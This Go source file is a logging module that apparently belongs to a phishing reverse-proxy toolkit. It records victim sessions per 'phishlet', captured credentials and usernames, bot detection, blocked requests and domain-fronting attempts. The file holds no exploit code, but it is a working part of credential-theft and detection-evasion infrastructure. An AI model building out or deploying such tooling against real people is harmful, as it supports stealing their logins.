package monitoring

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"os"
	"path/filepath"
	"runtime"
	"time"
)

type LogLevel string

const (
	LevelDebug LogLevel = "debug"
	LevelInfo  LogLevel = "info"
	LevelWarn  LogLevel = "warn"
	LevelError LogLevel = "error"
)

type LogConfig struct {
	Level           LogLevel `json:"level"`
	EnableFile      bool     `json:"enable_file"`
	FilePath        string   `json:"file_path"`
	EnableConsole   bool     `json:"enable_console"`
	EnableJSON      bool     `json:"enable_json"`
	MaxFileSize     int64    `json:"max_file_size"`
	MaxBackups      int      `json:"max_backups"`
	MaxAge          int      `json:"max_age"`
	CompressBackups bool     `json:"compress_backups"`
}

type Logger struct {
	logger *slog.Logger
	config LogConfig
	file   *os.File
}

type StructuredLogEntry struct {
	Timestamp   time.Time              `json:"timestamp"`
	Level       string                 `json:"level"`
	Message     string                 `json:"message"`
	Component   string                 `json:"component,omitempty"`
	SessionID   string                 `json:"session_id,omitempty"`
	UserAgent   string                 `json:"user_agent,omitempty"`
	IP          string                 `json:"ip,omitempty"`
	Country     string                 `json:"country,omitempty"`
	Phishlet    string                 `json:"phishlet,omitempty"`
	Method      string                 `json:"method,omitempty"`
	Path        string                 `json:"path,omitempty"`
	StatusCode  int                    `json:"status_code,omitempty"`
	Duration    time.Duration          `json:"duration,omitempty"`
	Error       string                 `json:"error,omitempty"`
	Fields      map[string]interface{} `json:"fields,omitempty"`
	Caller      string                 `json:"caller,omitempty"`
}

func NewLogger(config LogConfig) (*Logger, error) {
	logger := &Logger{
		config: config,
	}

	var writers []io.Writer

	if config.EnableConsole {
		writers = append(writers, os.Stdout)
	}

	if config.EnableFile {
		if err := os.MkdirAll(filepath.Dir(config.FilePath), 0755); err != nil {
			return nil, fmt.Errorf("failed to create log directory: %w", err)
		}

		file, err := os.OpenFile(config.FilePath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
		if err != nil {
			return nil, fmt.Errorf("failed to open log file: %w", err)
		}
		logger.file = file
		writers = append(writers, file)
	}

	if len(writers) == 0 {
		writers = append(writers, os.Stdout)
	}

	var handler slog.Handler
	multiWriter := io.MultiWriter(writers...)

	if config.EnableJSON {
		handler = slog.NewJSONHandler(multiWriter, &slog.HandlerOptions{
			Level: logger.getSlogLevel(),
			AddSource: true,
		})
	} else {
		handler = slog.NewTextHandler(multiWriter, &slog.HandlerOptions{
			Level: logger.getSlogLevel(),
			AddSource: true,
		})
	}

	logger.logger = slog.New(handler)
	return logger, nil
}

func (l *Logger) getSlogLevel() slog.Level {
	switch l.config.Level {
	case LevelDebug:
		return slog.LevelDebug
	case LevelInfo:
		return slog.LevelInfo
	case LevelWarn:
		return slog.LevelWarn
	case LevelError:
		return slog.LevelError
	default:
		return slog.LevelInfo
	}
}

func (l *Logger) Close() error {
	if l.file != nil {
		return l.file.Close()
	}
	return nil
}

func (l *Logger) Debug(msg string, fields ...interface{}) {
	l.log(slog.LevelDebug, msg, fields...)
}

func (l *Logger) Info(msg string, fields ...interface{}) {
	l.log(slog.LevelInfo, msg, fields...)
}

func (l *Logger) Warn(msg string, fields ...interface{}) {
	l.log(slog.LevelWarn, msg, fields...)
}

func (l *Logger) Error(msg string, fields ...interface{}) {
	l.log(slog.LevelError, msg, fields...)
}

func (l *Logger) log(level slog.Level, msg string, fields ...interface{}) {
	if !l.logger.Enabled(context.Background(), level) {
		return
	}

	_, file, line, ok := runtime.Caller(2)
	caller := ""
	if ok {
		caller = fmt.Sprintf("%s:%d", filepath.Base(file), line)
	}

	attrs := make([]slog.Attr, 0, len(fields)/2+1)
	attrs = append(attrs, slog.String("caller", caller))

	for i := 0; i < len(fields)-1; i += 2 {
		if key, ok := fields[i].(string); ok {
			attrs = append(attrs, slog.Any(key, fields[i+1]))
		}
	}

	l.logger.LogAttrs(context.Background(), level, msg, attrs...)
}

func (l *Logger) LogHTTPRequest(method, path, userAgent, ip string, statusCode int, duration time.Duration) {
	l.Info("HTTP request",
		"method", method,
		"path", path,
		"user_agent", userAgent,
		"ip", ip,
		"status_code", statusCode,
		"duration_ms", duration.Milliseconds(),
	)
}

func (l *Logger) LogSessionStart(sessionID, phishlet, ip, userAgent, country string) {
	l.Info("Session started",
		"session_id", sessionID,
		"phishlet", phishlet,
		"ip", ip,
		"user_agent", userAgent,
		"country", country,
	)
}

func (l *Logger) LogSessionEnd(sessionID, phishlet string, duration time.Duration, credentialsCaptured int) {
	l.Info("Session ended",
		"session_id", sessionID,
		"phishlet", phishlet,
		"duration_seconds", duration.Seconds(),
		"credentials_captured", credentialsCaptured,
	)
}

func (l *Logger) LogCredentialCapture(sessionID, phishlet, credType, username string) {
	l.Info("Credentials captured",
		"session_id", sessionID,
		"phishlet", phishlet,
		"type", credType,
		"username", username,
	)
}

func (l *Logger) LogBlockedRequest(ip, userAgent, reason, country string) {
	l.Warn("Request blocked",
		"ip", ip,
		"user_agent", userAgent,
		"reason", reason,
		"country", country,
	)
}

func (l *Logger) LogBotDetection(ip, userAgent, detectionType string, confidence float64) {
	l.Warn("Bot detected",
		"ip", ip,
		"user_agent", userAgent,
		"detection_type", detectionType,
		"confidence", confidence,
	)
}

func (l *Logger) LogDomainFronting(provider, frontDomain, realDomain string, success bool) {
	level := slog.LevelInfo
	if !success {
		level = slog.LevelWarn
	}

	l.log(level, "Domain fronting request",
		"provider", provider,
		"front_domain", frontDomain,
		"real_domain", realDomain,
		"success", success,
	)
}

func (l *Logger) LogError(component, operation string, err error, fields ...interface{}) {
	allFields := append([]interface{}{
		"component", component,
		"operation", operation,
		"error", err.Error(),
	}, fields...)
	
	l.Error("Operation failed", allFields...)
}

func (l *Logger) LogStructured(entry StructuredLogEntry) {
	if l.config.EnableJSON {
		jsonData, err := json.Marshal(entry)
		if err == nil {
			l.Info(string(jsonData))
		}
	} else {
		l.Info(entry.Message,
			"component", entry.Component,
			"session_id", entry.SessionID,
			"ip", entry.IP,
			"country", entry.Country,
		)
	}
}
